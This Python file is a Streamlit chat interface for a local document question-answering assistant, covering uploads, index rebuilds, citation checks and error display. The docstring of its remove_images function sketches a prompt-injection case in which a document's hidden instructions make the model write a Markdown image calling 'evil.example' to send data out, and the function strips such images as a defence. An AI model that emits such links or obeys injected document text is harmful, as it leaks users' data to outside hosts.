"""Streamlit chat UI. Talks ONLY to the FastAPI backend over HTTP — never imports app.*.

Run:  streamlit run ui/streamlit_app.py   (the API must be running on API_URL)
"""

import os
import re
from dataclasses import dataclass
from typing import Any

import httpx
import streamlit as st

API_URL = os.environ.get("API_URL", "http://localhost:8000").rstrip("/")
DEFAULT_TIMEOUT_S = 10.0
ASK_TIMEOUT_S = 180.0  # longer than the API's own LLM timeout (LLM_TIMEOUT_S=120)
REBUILD_TIMEOUT_S = 300.0
START_API_COMMAND = "uvicorn app.api.main:app --reload"
# Markdown image: ![alt](url). The browser would load the url automatically.
MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
# Same rule as app/generation/citations.py, copied because the UI must stay independent of app/:
# [file.pdf] or [file.pdf, p. 3], only for file types the app can index.
CITATION_PATTERN = re.compile(r"(?<![\w\]])\[([^\[\],]+\.(?:md|pdf|txt))(?:,\s*p\.\s*(\d+))?\]", re.IGNORECASE)


# ---------- HTTP helpers (no Streamlit here, so tests can call them directly) ----------

@dataclass
class ApiResult:
    ok: bool
    status: int | None  # None means we never got an answer from the API
    data: Any = None
    error: str = ""


def error_message(response: httpx.Response) -> str:
    """Turn the API's error body into one readable sentence."""
    try:
        detail = response.json().get("detail")
    except (ValueError, AttributeError):
        return f"HTTP {response.status_code}"

    if isinstance(detail, list):
        # 422 from Pydantic: a list like [{"loc": ["body", "question"], "msg": "..."}]
        parts = []
        for item in detail:
            field = ".".join(str(part) for part in item.get("loc", [])[1:]) or "request"
            parts.append(f"{field}: {item.get('msg', 'invalid')}")
        return "; ".join(parts)
    return str(detail) if detail else f"HTTP {response.status_code}"


def call_api(
    method: str, path: str, timeout: float = DEFAULT_TIMEOUT_S, client: httpx.Client | None = None, **kwargs
) -> ApiResult:
    """Send one request. Never raises: every failure becomes an ApiResult with ok=False."""
    http = client or httpx.Client(base_url=API_URL)
    try:
        response = http.request(method, path, timeout=timeout, **kwargs)
    except httpx.TimeoutException:
        return ApiResult(False, None, error=f"The API at {API_URL} did not answer within {timeout:.0f} s.")
    except httpx.HTTPError:
        return ApiResult(False, None, error=f"Cannot reach the API at {API_URL}. Start it with: {START_API_COMMAND}")
    finally:
        if client is None:
            http.close()

    if response.is_success:
        return ApiResult(True, response.status_code, response.json())
    return ApiResult(False, response.status_code, error=error_message(response))


def get_health(client: httpx.Client | None = None) -> ApiResult:
    return call_api("GET", "/health", client=client)


def get_documents(client: httpx.Client | None = None) -> ApiResult:
    return call_api("GET", "/documents", client=client)


def ask(question: str, client: httpx.Client | None = None) -> ApiResult:
    return call_api("POST", "/ask", timeout=ASK_TIMEOUT_S, client=client, json={"question": question})


def upload(filename: str, content: bytes, mime_type: str | None, client: httpx.Client | None = None) -> ApiResult:
    files = {"file": (filename, content, mime_type or "application/octet-stream")}
    return call_api("POST", "/documents", client=client, files=files)


def rebuild(client: httpx.Client | None = None) -> ApiResult:
    return call_api("POST", "/index/rebuild", timeout=REBUILD_TIMEOUT_S, client=client)


def remove_images(text: str) -> str:
    """Drop Markdown images from LLM output.

    A document could contain hidden instructions that make the model write
    ![x](http://evil.example/?data=...). Rendering it would make the browser
    send a request to that site without any click. Links are kept: they need a click.
    """
    return MARKDOWN_IMAGE.sub("[image removed]", text)


def extract_citations(text: str) -> list[str]:
    """Citation tags in the order they first appear, without duplicates."""
    tags = []
    for source, page in CITATION_PATTERN.findall(text):
        tag = f"[{source.strip()}, p. {page}]" if page else f"[{source.strip()}]"
        if tag not in tags:
            tags.append(tag)
    return tags


def citation_check(answer: dict) -> list[dict]:
    """One row per citation in the answer: is it one of the sources the model was given?

    The API's invalid_citations list is the source of truth; this only lays it out for display.
    """
    invalid = set(answer.get("invalid_citations", []))
    rows = [{"tag": tag, "valid": tag not in invalid} for tag in extract_citations(answer.get("answer", ""))]
    # A tag the API flagged but our pattern missed must still be shown.
    seen = {row["tag"] for row in rows}
    rows += [{"tag": tag, "valid": False} for tag in answer.get("invalid_citations", []) if tag not in seen]
    return rows


def health_summary(health: dict) -> tuple[str, str, str]:
    """(badge colour, icon, words) for the status badge. Words always say it; colour only repeats it."""
    if not health["index_loaded"]:
        return "orange", ":material/warning:", "No index yet"
    if not health["llm_reachable"]:
        return "orange", ":material/warning:", "Ollama offline"
    return "green", ":material/check_circle:", "Ready"


def format_details(answer: dict) -> str:
    """Small caption under an answer: model, prompt version, timings."""
    t = answer.get("timings_ms", {})
    return (
        f"{answer.get('model', '?')} · prompt {answer.get('prompt_version', '?')} · "
        f"retrieve {t.get('retrieve', 0):.0f} ms · generate {t.get('generate', 0):.0f} ms · "
        f"total {t.get('total', 0):.0f} ms"
    )


# ---------- Streamlit UI ----------

def show_notice() -> None:
    """Show a message saved before st.rerun() (e.g. 'Upload saved'), then forget it."""
    notice = st.session_state.pop("notice", None)
    if notice:
        kind, text = notice
        icon = ":material/check_circle:" if kind == "success" else ":material/warning:"
        getattr(st.sidebar, kind)(text, icon=icon)


def render_sidebar() -> bool:
    """Draw the sidebar. Returns False if the API is down."""
    st.sidebar.markdown("### :material/menu_book: Knowledge Assistant")
    health = get_health()
    if not health.ok:
        st.sidebar.badge("API offline", icon=":material/error:", color="red")
        return False

    h = health.data
    colour, icon, words = health_summary(h)
    st.sidebar.badge(words, icon=icon, color=colour)
    left, right = st.sidebar.columns(2)
    left.caption("Model")
    left.markdown(f"`{h['model']}`")
    right.caption("Chunks in index")
    right.markdown(f"**{h['chunks']}**")
    if not h["llm_reachable"]:
        st.sidebar.caption("Start Ollama with `ollama serve`. Questions fail until then.")
    if not h["index_loaded"]:
        st.sidebar.caption("Upload documents, then rebuild the index.")

    show_notice()

    st.sidebar.divider()
    st.sidebar.markdown("**Documents**")
    documents = get_documents()
    if documents.ok and documents.data:
        for doc in documents.data:
            unit = "chunk" if doc["chunks"] == 1 else "chunks"
            st.sidebar.markdown(f":material/description: `{doc['source']}` · {doc['chunks']} {unit}")
    elif documents.ok:
        st.sidebar.caption("No documents indexed yet.")

    uploaded = st.sidebar.file_uploader(
        "Add a document", type=["pdf", "md", "txt"], help="PDF, Markdown or text, up to 10 MB."
    )
    if uploaded is not None and st.sidebar.button("Upload", icon=":material/upload:", width="stretch"):
        result = upload(uploaded.name, uploaded.getvalue(), uploaded.type)
        if result.ok:
            st.session_state.notice = ("success", f"Saved `{result.data['filename']}`. Rebuild the index to search it.")
        else:
            st.session_state.notice = ("warning", f"Upload refused: {result.error}")
        st.rerun()

    if st.sidebar.button("Rebuild index", icon=":material/refresh:", width="stretch"):
        with st.sidebar, st.spinner("Rebuilding the index…"):
            result = rebuild()
        if result.ok:
            d = result.data
            st.session_state.notice = (
                "success",
                f"Index rebuilt: {d['documents']} documents, {d['chunks']} chunks in {d['seconds']} s.",
            )
        else:
            st.session_state.notice = ("warning", f"Rebuild failed: {result.error}")
        st.rerun()

    st.sidebar.divider()
    st.sidebar.caption("Runs on this computer. Nothing is sent to the internet.")
    return True


def render_citation_check(answer: dict) -> None:
    """The signature view: every citation in the answer, checked against what the model was given."""
    rows = citation_check(answer)
    if not rows:
        if not answer["abstained"]:
            st.caption(":material/info: This answer cites no source.")
        return
    given = len(answer["sources"])
    for row in rows:
        if row["valid"]:
            st.badge(f"{row['tag']} · given to the model", icon=":material/check_circle:", color="green")
        else:
            st.badge(
                f"{row['tag']} · not among the {given} sources the model was given",
                icon=":material/error:",
                color="red",
            )


def render_sources(answer: dict) -> None:
    cited = {row["tag"] for row in citation_check(answer) if row["valid"]}
    label = f"Sources searched ({len(answer['sources'])})"
    with st.expander(label, icon=":material/manage_search:"):
        for source in answer["sources"]:
            marker = "  ·  cited" if source["citation"] in cited else ""
            score = max(0.0, min(1.0, source["score"]))
            st.progress(score, text=f"`{source['citation']}`  score {source['score']:.3f}{marker}")
            st.text(source["snippet"])


def render_answer(message: dict) -> None:
    """Draw one assistant message: an error, an abstention, or an answer with sources."""
    if message.get("error"):
        status = message.get("status")
        if status == 503:
            st.error(f"The assistant is unavailable: {message['error']}", icon=":material/cloud_off:")
        elif status == 502:
            st.error(f"The language model returned an error: {message['error']}", icon=":material/error:")
        elif status == 422:
            st.warning(f"Please change your question: {message['error']}", icon=":material/edit:")
        else:
            st.error(message["error"], icon=":material/error:")
        return

    answer = message["answer"]
    if answer["abstained"]:
        # Not an error: the app is doing its job by refusing to guess.
        st.info(answer["answer"], icon=":material/search_off:")
        if answer["timings_ms"].get("generate", 0) == 0:
            st.caption("No source was close enough to the question, so nothing was sent to the LLM.")
    else:
        st.markdown(remove_images(answer["answer"]))

    render_citation_check(answer)
    if answer["sources"]:
        render_sources(answer)
    st.caption(format_details(answer))


def render_empty_state() -> None:
    st.markdown("#### Ask about your documents")
    st.markdown(
        "Answers come only from your documents (listed in the side panel). Every citation is checked "
        "against the sources the model was given, and if nothing matches well enough, "
        "the assistant says so instead of guessing."
    )


def render_chat() -> None:
    if "messages" not in st.session_state:
        st.session_state.messages = []

    # Read the box first (Streamlit pins it to the bottom anyway), so the guide hides as soon as a question is sent.
    question = st.chat_input("Ask a question about your documents")
    if not st.session_state.messages and not question:
        render_empty_state()

    for message in st.session_state.messages:
        avatar = ":material/person:" if message["role"] == "user" else ":material/menu_book:"
        with st.chat_message(message["role"], avatar=avatar):
            if message["role"] == "user":
                st.markdown(message["text"])
            else:
                render_answer(message)

    if not question:
        return

    st.session_state.messages.append({"role": "user", "text": question})
    with st.chat_message("user", avatar=":material/person:"):
        st.markdown(question)

    with st.chat_message("assistant", avatar=":material/menu_book:"):
        with st.spinner("Searching your documents and asking the local LLM…"):
            result = ask(question)
        if result.ok:
            message = {"role": "assistant", "answer": result.data}
        else:
            message = {"role": "assistant", "error": result.error, "status": result.status}
        render_answer(message)
    st.session_state.messages.append(message)


def main() -> None:
    st.set_page_config(page_title="AI Knowledge Assistant", page_icon=":material/menu_book:")
    st.title("AI Knowledge Assistant")
    st.caption("Answers only from your documents, with citations. Everything runs on this computer.")

    if not render_sidebar():
        st.error(f"Cannot reach the API at {API_URL}. Start it in another terminal:", icon=":material/cloud_off:")
        st.code(START_API_COMMAND, language="bash")
        st.stop()

    render_chat()


if __name__ == "__main__":
    main()
